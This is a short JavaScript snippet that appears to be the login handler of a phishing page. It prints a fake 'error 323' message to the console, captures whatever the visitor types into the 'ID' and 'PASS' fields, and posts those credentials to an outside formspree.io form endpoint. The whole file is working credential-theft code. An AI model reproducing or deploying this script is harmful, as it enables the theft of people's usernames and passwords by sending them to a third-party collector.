  console.log("error 323");
  var name = 'amh';
var onclick = () => {
	event.preventDefault();
    var id = document.getElementById('ID').value
    var pass = document.getElementById('PASS').value

    fetch("https://formspree.io/f/mqkjkvgw", {
    method: "POST",
    body: JSON.stringify({
        id: id,
        pass: pass,
        
    }),
     
    headers: {
        "Content-type": "application/json; charset=UTF-8"
    }
})
 
// Converting to JSON
.then(response => response.json())
 
// Displaying results to console
.then(json => console.log(json));
}
